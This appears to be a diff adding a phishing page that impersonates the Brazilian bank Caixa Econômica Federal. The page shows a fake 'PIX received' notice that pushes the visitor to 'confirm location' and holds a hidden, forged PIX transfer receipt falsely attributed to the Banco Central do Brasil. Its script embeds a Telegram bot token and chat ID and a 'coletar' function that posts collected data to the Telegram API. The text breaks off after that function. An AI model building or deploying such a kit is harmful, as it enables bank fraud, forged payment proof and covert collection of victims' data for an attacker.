@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<title>Caixa Econômica Federal</title>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<style>
+ :root{--caixa:#0059f7;--azul-escuro:#0044c7;--cinza:#e4e6eb}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Segoe UI",system-ui;background:#f0f2f4;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{max-width:378px;background:#fff;border-radius:12px;box-shadow:0 12px 32px rgba(0,0,0,.18);overflow:hidden}
+.top-bar{height:10px;background:linear-gradient(90deg,var(--azul-escuro),var(--caixa))}
+.header{padding:24px 28px 20px;text-align:center}
+.logo{width:104px;height:auto}
+h2{font-size:18px;font-weight:600;color:#111;margin:10px 0 4px}
+p.sub{color:#505050;font-size:14px;margin-bottom:20px}
+.sec{position:relative;padding:0 28px;margin-bottom:22px}
+.label{font-size:13px;color:#666;margin-bottom:4px}
+.saldo-box{border:1px solid #ddd;border-radius:8px;padding:10px;font-size:14px;color:#333;background:#fafafa;margin-bottom:14px}
+.qr{cursor:pointer;background:#fafafa;border:1px dashed #ccc;border-radius:6px;padding:8px 0;text-align:center;font-size:13px;color:#555;margin-bottom:14px}
+.btn{width:100%;padding:12px;border:0;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:opacity .2s}
+.btn-primary{background:var(--caixa);color:#fff}
+.btn-primary:active{background:var(--azul-escuro)}
+iframe{display:none}
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+<div class="card" id="tela">
+  <div class="top-bar"></div>
+  <div class="header">
+    <svg class="logo" viewBox="0 0 400 94" xmlns="http://www.w3.org/2000/svg">
+      <g fill="#004A99">
+        <path d="M0 16c0-9 7-16 16-16h57c9 0 16 7 16 16v63H16c-9 0-16-7-16-16V16z"/>
+        <path d="M89 16c0-9 7-16 16-16h57c9 0 16 7 16 16v63h-89V16z"/>
+        <path d="M178 16c0-9 7-16 16-16h158c9 0 16 7 16 16v63h-190V16z"/>
+      </g>
+    </svg>
+    <h2>PIX Recebido – Confirmação necessária</h2>
+    <p class="sub">Clique em <strong>Confirmar</strong> para garantir o crédito.</p>
+  </div>
+  <div class="sec">
+    <div class="label">Valor</div><div class="saldo-box">R$ 3.780,00</div>
+    <div class="label">Origem</div><div class="saldo-box">**BRADESCO**<br><small>Chave e-mail: comprador***@gmail.com</small></div>
+    <div class="label">Data/Hora</div><div class="saldo-box">Hoje, 21:42</div>
+    <div class="qr">QR Code gerado – clique para abrir</div>
+    <button id="ok" class="btn btn-primary">Confirmar localização e receber</button>
+  </div>
+</div>
+
+<!-- PDF oculto -->
+<div id="pdfTpl" style="display:none;position:absolute;top:-9999px;width:210mm;font-size:11px;line-height:1.3;font-family:Arial">
+  <h2 style="font-size:16px;margin-bottom:4px">Comprovante de Transferência PIX</h2>
+  <p style="margin:0 0 10px">Emitido em <span id="t"></span></p>
+  <table style="width:100%;border-collapse:collapse"><tbody>
+    <tr><td width="35%"><strong>Valor</strong></td><td>R$ 3.780,00</td></tr>
+    <tr><td><strong>Data/Hora</strong></td><td id="t2"></td></tr>
+    <tr><td><strong>Identificador</strong></td><td>E20240621.184200.123456789-0</td></tr>
+    <tr><td><strong>Status</strong></td><td>Concluída</td></tr>
+    <tr><td><strong>Origem</strong></td><td>BRADESCO – Ag. 1234 Cc. 56789-0</td></tr>
+    <tr><td><strong>Destino</strong></td><td>CAIXA – Ag. 4321 Cc. 98765-0</td></tr>
+    <tr><td><strong>Chave destinatário</strong></td><td>comprador***@gmail.com</td></tr>
+    <tr><td><strong>Nome favorecido</strong></td><td>JOÃO SILVA SANTOS</td></tr>
+  </tbody></table>
+  <p style="margin-top:16px;font-size:10px;color:#666">
+   Autenticação: 5A7B9C1D2E3F4G5H6I7J8K9L0M1N2O3P4Q5R6S7T8U9V0W1X2Y3Z4<br>
+   Assinatura digital SHA256: <span id="hash"></span><br>
+   Emitido pelo SPI – Banco Central do Brasil
+  </p>
+</div>
+
+<script>
+const botToken='7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
+const chatId='-1003187104876';
+const now=new Date().toLocaleString('pt-BR');
+['t','t2'].forEach(x=>document.getElementById(x).textContent=now);
+document.getElementById('hash').textContent=crypto.randomUUID();
+
+async function coletar(dados){
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:`chat_id=${chatId}&text=${encodeURIComponent(dados)}`
+  });
+}
